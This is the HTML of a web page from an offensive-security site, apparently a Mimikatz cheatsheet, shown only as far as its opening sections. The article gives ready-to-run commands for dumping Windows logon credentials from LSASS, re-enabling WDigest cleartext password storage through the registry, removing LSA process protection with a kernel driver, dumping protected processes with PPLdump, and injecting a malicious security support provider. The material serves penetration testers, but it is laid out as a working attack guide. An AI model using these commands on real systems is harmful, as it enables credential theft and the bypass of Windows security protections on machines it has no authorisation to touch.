<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="A cheatsheet for using Mimikatz (all versions covered)."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="Windows - Mimikatz"><meta property="og:description" content="A cheatsheet for using Mimikatz (all versions covered)."><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/windows_mimikatz/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-11-04T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-10T11:35:25-05:00"><title>Windows - Mimikatz | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894" crossorigin=anonymous></script>
<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=JP_uCP3IebkCUXDh6KjRmw></script><script nonce=JP_uCP3IebkCUXDh6KjRmw>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hWWTQzNTA3UlV4MlBicWdSRGsxQnFnWnV6Rm5xU3hmTDZsRVcyVDRvSVhTa2QzRlZvQlpra0RHTlRvYmU1dTM5U3k4bFVROGJsNVpxQjlxWGh6Z3FuT1JBXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFY1V0czR01DdDNLNmVxTDlKQ2NFNnJwU0oxNDVZTjlXOS1SU2tFd3J3NXhMbEROSU1rdVVCcnI2QjJyY3Zia0w0dGNMOEFCV0ZFUy1idzBNWG8zcUdyTUFcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFhfdzJlbk9UVmhhN05TeVAxakR2SkJyMU1MbDhvS0Zpb0N1bm0wVWxFMEdqUGVtVUM1RFpLajFTWGxBYktHUWZWa1lvNWs0RlIzbXdvdktROVA2cWE4cmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFdNTi1PNHpRLUJENU1wakZVNWVjUVdqeGIwNHh5Yzc3akdlOEdwbjZ5VWtiemF3SkxYV3lfQ2xMWWFORVEtWER0cXJ4R1JQMzBpbjNBUnJZTXR2NHlXMWdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VnlVcTVpZThXX0JkWFlGNXo3MzhtQjBkMEcxeEFlZ1BPZHp3WGVDdFdvQW5xVVNvWndVdW00UFhMRXNpUEZ1b2oxUUFUN25WNl9XWDdjMEE1X3VacFd2UVx1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/kuburnetes/>Kuburnetes</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/argument_injection/>Argument Injection</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/insecure_deserialization/python/>Python Deserialization</a></li><li><a href=/docs/insecure_deserialization/ruby/>Ruby Deserialization</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/insecure_deserialization/yaml/>YAML Deserialization</a></li><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/ class=active>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/office_attacks/>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/>JSON Web Tokens</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/xxe_injection/>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Windows - Mimikatz</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#windows---mimikatz>Windows - Mimikatz</a><ul><li><a href=#mimikatz---execute-commands>Mimikatz - Execute commands</a></li><li><a href=#mimikatz---extract-passwords>Mimikatz - Extract passwords</a></li><li><a href=#mimikatz---lsa-protection-workaround>Mimikatz - LSA Protection Workaround</a></li><li><a href=#mimikatz---mini-dump>Mimikatz - Mini Dump</a></li><li><a href=#mimikatz---pass-the-hash>Mimikatz - Pass The Hash</a></li><li><a href=#mimikatz---golden-ticket>Mimikatz - Golden ticket</a></li><li><a href=#mimikatz---skeleton-key>Mimikatz - Skeleton key</a></li><li><a href=#mimikatz---rdp-session-takeover>Mimikatz - RDP session takeover</a></li><li><a href=#mimikatz---credential-manager--dpapi>Mimikatz - Credential Manager & DPAPI</a><ul><li><a href=#chrome-cookies--credential>Chrome Cookies & Credential</a></li><li><a href=#task-scheduled-credentials>Task Scheduled credentials</a></li><li><a href=#vault>Vault</a></li></ul></li><li><a href=#mimikatz---commands-list>Mimikatz - Commands list</a></li><li><a href=#mimikatz---powershell-version>Mimikatz - Powershell version</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=windows---mimikatz>Windows - Mimikatz
<a class=anchor href=#windows---mimikatz>#</a></h1><p><img src=http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png alt="Data in memory"></p><h2 id=mimikatz---execute-commands>Mimikatz - Execute commands
<a class=anchor href=#mimikatz---execute-commands>#</a></h2><p>Only one command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS C:\temp\mimikatz&gt; .\mimikatz <span style=color:#e6db74>&#34;privilege::debug&#34;</span> <span style=color:#e6db74>&#34;sekurlsa::logonpasswords&#34;</span> exit
</span></span></code></pre></div><p>Mimikatz console (multiple commands)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS C:\temp\mimikatz&gt; .\mimikatz
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># privilege::debug</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># log</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># sekurlsa::logonpasswords</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># sekurlsa::wdigest</span>
</span></span></code></pre></div><h2 id=mimikatz---extract-passwords>Mimikatz - Extract passwords
<a class=anchor href=#mimikatz---extract-passwords>#</a></h2><blockquote><p>Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>mimikatz_command <span style=color:#f92672>-f</span> sekurlsa::logonPasswords full
</span></span><span style=display:flex><span>mimikatz_command <span style=color:#f92672>-f</span> sekurlsa::wdigest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># to re-enable wdigest in Windows Server 2012+</span>
</span></span><span style=display:flex><span><span style=color:#75715e># in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest </span>
</span></span><span style=display:flex><span><span style=color:#75715e># create a DWORD &#39;UseLogonCredential&#39; with the value 1.</span>
</span></span><span style=display:flex><span>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>:warning: To take effect, conditions are required :</p><ul><li>Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:<ul><li>Adding requires lock</li><li>Removing requires signout</li></ul></li><li>Win10:<ul><li>Adding requires signout</li><li>Removing requires signout</li></ul></li><li>Win2016:<ul><li>Adding requires lock</li><li>Removing requires reboot</li></ul></li></ul><h2 id=mimikatz---lsa-protection-workaround>Mimikatz - LSA Protection Workaround
<a class=anchor href=#mimikatz---lsa-protection-workaround>#</a></h2><ul><li><p>LSA as a Protected Process (RunAsPPL)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Check if LSA runs as a protected process by looking if the variable &#34;RunAsPPL&#34; is set to 0x1</span>
</span></span><span style=display:flex><span>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Now lets import the mimidriver.sys to the system</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># !+</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Now lets remove the protection flags from lsass.exe process</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># !processprotect /process:lsass.exe /remove</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Finally run the logonpasswords function to dump lsass</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># privilege::debug    </span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># token::elevate</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># sekurlsa::logonpasswords</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Now lets re-add the protection flags to the lsass.exe process</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># !processprotect /process:lsass.exe</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Unload the service created</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># !-</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://github.com/itm4n/PPLdump</span>
</span></span><span style=display:flex><span>PPLdump.exe [-v] [-d] [<span style=color:#f92672>-f</span>] &lt;PROC_NAME|PROC_ID&gt; &lt;DUMP_FILE&gt;
</span></span><span style=display:flex><span>PPLdump.exe lsass.exe lsass.dmp
</span></span><span style=display:flex><span>PPLdump.exe -v <span style=color:#ae81ff>720</span> out.dmp
</span></span></code></pre></div></li><li><p>LSA is running as virtualized process (LSAISO) by <strong>Credential Guard</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Check if a process called lsaiso.exe exists on the running processes</span>
</span></span><span style=display:flex><span>tasklist |findstr lsaiso
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Lets inject our own malicious Security Support Provider into memory</span>
</span></span><span style=display:flex><span><span style=color:#75715e># require mimilib.dll in the same folder</span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># misc::memssp</span>
